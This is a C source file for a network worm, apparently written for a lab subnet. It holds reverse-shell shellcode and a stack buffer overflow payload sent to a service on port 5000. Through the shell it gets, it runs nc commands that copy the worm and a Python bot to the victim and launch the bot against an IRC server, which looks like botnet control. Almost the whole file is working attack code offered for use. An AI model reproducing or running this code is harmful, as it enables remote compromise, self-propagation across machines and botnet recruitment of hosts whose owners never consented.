#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <time.h>
#include <ifaddrs.h>

#define BUF_SIZE 1064

char shellcode[] = 
     "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\xB9\x11\x11\x11\x11\x81\xF1\x1B\x40\x11\x17\x51\x31\xC9\x66\x68\x11"
        "\x5c\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";

char vic_addr[16];
int check = 0;
//standard offset (probably must be modified)
#define RET 0xbffff083
 
// int check()
// {
//   char *p;
//   p = (char*)getenv("SUCCESS");
//   if(p!=NULL && p[0]=='Y')
//     return 1;
//   return 0;
// }

void *handling (void *ptr)
{
  int s, c, cli_size, bytes, i;
  struct sockaddr_in srv, cli;
  char buffer[BUF_SIZE];

  s = socket(AF_INET, SOCK_STREAM, 0);
  if(s<0)
  {
    fprintf(stderr,"socket fail\n");
    return;
  }

  srv.sin_addr.s_addr = INADDR_ANY;
  srv.sin_port = htons(4444);
  srv.sin_family = AF_INET;
  if(bind(s,(struct sockaddr*) &srv, sizeof(srv)) == -1)
  {
    fprintf(stderr,"bind fail\n");
    return;
  }

  if(listen(s,3) == -1)
  {
    fprintf(stderr,"listen fail\n");
    return 0;
  }

  c = accept(s, (struct sockaddr*) &cli, &cli_size);
  if(c == -1)
  {
    fprintf(stderr,"accept fail\n");
    return;
  }

  //putenv("SUCCESS=Y");
  check = 1;

  fprintf(stderr,"Spread complete\n");

  memcpy(buffer, "pwd\x0A", 4);
  bytes = send(c, buffer, 4, 0);
  if(bytes == -1)
    return
  
  bytes = recv(c,buffer,sizeof(buffer),0);
  if(bytes == -1)
    return;
  
  buffer[bytes-1] = 0;
  memcpy(buffer, "nc -l 12000 >wormMV\x0A",20);
  bytes = send(c,buffer,20,0);
  sleep(5);
  char cmt[] = "nc ";
  strcat(cmt,vic_addr);
  strcat(cmt," 12000 <wormMV\n");
  system(cmt);

  memcpy(buffer, "chmod +x wormMV\x0A",16);
  bytes = send(c,buffer,16,0);
  memcpy(buffer, "./wormMV\x0A",9);
  sleep(2);
  bytes = send(c,buffer,9,0);

  memcpy(buffer, "nc -l 12001 >worker.py\x0A",23);
  bytes = send(c,buffer,23,0);
  sleep(5);

  char cm[] = "nc ";
  strcat(cm,vic_addr);
  strcat(cm," 12001 <worker.py\n");
  system(cm);
 
  memcpy(buffer, "chmod +x worker.py\x0A",19);
  bytes = send(c,buffer,19,0);

  memcpy(buffer, "python worker.py -b daboss1 -s stockholm.se.quakenet.org\x0A",57);
  sleep(2);
  bytes = send(c,buffer,57,0);  
  
  if(bytes == -1)
    return;
  
  close(s);
}

char* gethostipaddress(char* address, size_t size) {
struct ifaddrs *addrs, *tmp;
    if (getifaddrs(&addrs) == -1) {
        perror("getifaddrs");
        return -1;
    }
    for (tmp = addrs; tmp != NULL; tmp = tmp->ifa_next) {
        if (tmp->ifa_addr != NULL && tmp->ifa_addr->sa_family == AF_INET &&
            strcmp(tmp->ifa_name, "lo") != 0) {
            struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
            inet_ntop(AF_INET, &pAddr->sin_addr, address, size);
            freeifaddrs(addrs);
            return address;
        }
    }
    freeifaddrs(addrs);
    return -1;
}

int exploit(char* victim_addr, int victim_port, char* back_ip, int back_port)
{
  char buffer[BUF_SIZE];
  int s,i,j,size;

  struct sockaddr_in remote;
  int ii=0;
  char n[3];
  int d=0;
  i=0;
  for(ii=0;ii<strlen(back_ip);ii++)
  {
      n[d]=back_ip[ii];
      d+=1;
      if(back_ip[ii]=='.')
      {
          int ia;
          sscanf(n, "%d", &ia);
          shellcode[39+i] = ia ^ 17;
          d=0;
          i+=1;
          memset(n, 0, sizeof(n));
      } 
  }
  int ia;
  sscanf(n, "%d", &ia);
  shellcode[39+i] = ia ^ 17;

  memset(buffer, 0x90, BUF_SIZE);
  memcpy(buffer+900-sizeof(shellcode), shellcode, sizeof(shellcode)-1);
  for(i=901; i < BUF_SIZE-4; i+=4) { 
    * ((int *) &buffer[i]) = RET;
  }
  buffer[BUF_SIZE-1] = 0x0;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if(s<0)
  {
    fprintf(stderr, "Error: socket\n");
    return -1;
  }

  remote.sin_family = AF_INET;
  inet_aton(victim_addr,&remote.sin_addr.s_addr);
  remote.sin_port = htons(victim_port);

  if(connect(s, (struct sockaddr*)&remote, sizeof(remote)) == -1)
    {
      close(s);
      fprintf(stderr,"Error: Connect\n");
      return 0;
    }

  size = send(s, buffer, sizeof(buffer), 0);
  if(size== -1)
  {
    close(s);
    fprintf(stderr,"Error: send data\n");
    return -1;
  }

  sleep(5);
  if(check)
  {
    fprintf(stderr,"Success !!\n");
    // check = 0;
    close(s);
    return 1;
  }
  else
  {
    fprintf(stderr,"False !!\n");
    close(s);
    return 0;
  }
}

int main() {
  pthread_t thread1;
  int iret;
  char back_ip[16];
  int back_port = 4444, victim_port = 5000;
  int m;

  srand(time(NULL));  
  iret = pthread_create(&thread1, NULL, handling, NULL);

  for(;;)
  {
    if(check)
      continue ;
    gethostipaddress(back_ip,16);
    for(;;)
    {
      char victim_addr[16] = "192.168.79."; 
      int r = 145;
      char  buf[4];
      sprintf(buf, "%d", r);
      strcat(victim_addr,buf);
      if(victim_addr != "192.168.79.144" && victim_addr != back_ip )
        {
          strcpy(vic_addr,victim_addr);
          break;
        }
    }

    if(exploit(vic_addr,victim_port,back_ip,back_port))
    {
      pthread_join(thread1, NULL);
      iret = pthread_create(&thread1, NULL, handling, NULL);
    }
    break;
  }
}
